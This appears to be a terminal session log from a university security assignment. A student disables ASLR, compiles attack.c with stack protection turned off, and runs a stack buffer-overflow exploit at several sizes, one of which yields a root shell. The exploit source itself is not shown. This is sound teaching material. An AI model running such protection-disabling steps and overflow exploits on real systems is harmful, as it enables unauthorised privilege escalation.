@@ -1,0 +1,67 @@
+Script started on Fri 31 Mar 2017 11:36:40 PM EDT
+root@js-156-92:/class/assignment/Submitted# echo 0 | sudo tee /proc/sys/kernel/r 
+andomize_va_space
+0
+root@js-156-92:/class/assignment/Submitted# gcc -fno-stack-protector -z execstac 
+k attack.c -o attack
+attack.c: In function ‘main’:
+attack.c:20:7: warning: incompatible implicit declaration of built-in function ‘exit’ [enabled by default]
+       exit(0);
+       ^
+attack.c:24:14: warning: incompatible implicit declaration of built-in function ‘malloc’ [enabled by default]
+       buff = malloc(bsize);
+              ^
+attack.c:26:12: warning: assignment makes pointer from integer without a cast [enabled by default]
+       addr = get_sp() -offset;
+            ^
+attack.c:27:7: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘long long int *’ [-Wformat=]
+       printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr); 
+       ^
+attack.c:33:18: warning: assignment makes integer from pointer without a cast [enabled by default]
+       *(addr_ptr)=addr;
+                  ^
+attack.c:38:23: warning: assignment makes integer from pointer without a cast [enabled by default]
+       buff[bsize - 1] = (char*)NULL; 
+                       ^
+root@js-156-92:/class/assignment/Submitted# ./attack 1030[K[K24 12000
+140737488348496
+Using address as guess for beginning of attack buffer: 0xffffb670
+
+Length of Input String:1022
+
+
+Value of Test:ffffba88
+Value of filename[0]:ffffb680
+
+You are going to need a buffer a little larger than:1032
+
+root@js-156-92:/class/assignment/Submitted# ./attack 1056 12000
+140737488348496
+Using address as guess for beginning of attack buffer: 0xffffb670
+
+Length of Input String:1054
+
+
+Value of Test:ffffba68
+Value of filename[0]:ffffb660
+
+You are going to need a buffer a little larger than:1032
+
+# 
+# 
+# exit
+root@js-156-92:/class/assignment/Submitted# ./attack 1064 12000
+140737488348496
+Using address as guess for beginning of attack buffer: 0xffffb670
+
+Length of Input String:1062
+
+
+Value of Test:ffffba58
+Value of filename[0]:ffffb650
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+root@js-156-92:/class/assignment/Submitted# exit
+Script done on Fri 31 Mar 2017 11:38:51 PM EDT
